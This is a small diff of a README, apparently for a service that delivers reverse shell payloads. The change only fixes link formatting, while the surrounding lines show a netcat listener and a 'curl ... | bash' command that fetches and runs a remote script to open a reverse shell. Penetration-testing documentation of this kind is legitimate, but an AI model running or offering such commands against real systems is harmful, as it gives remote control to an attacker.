@@ -15,7 +15,7 @@ pull down reverse shell payloads from the *cloud* ☁️  to your terminal using
 nc -lvnp 1234
 ```
 
-* Then query `[rshell.sh](https://rshell.sh)` to kick off the reverse shell:
+* Then query [`rshell.sh`](https://rshell.sh) to kick off the reverse shell:
 
 ```
 curl rshell.sh/127.0.0.1/1234 | bash
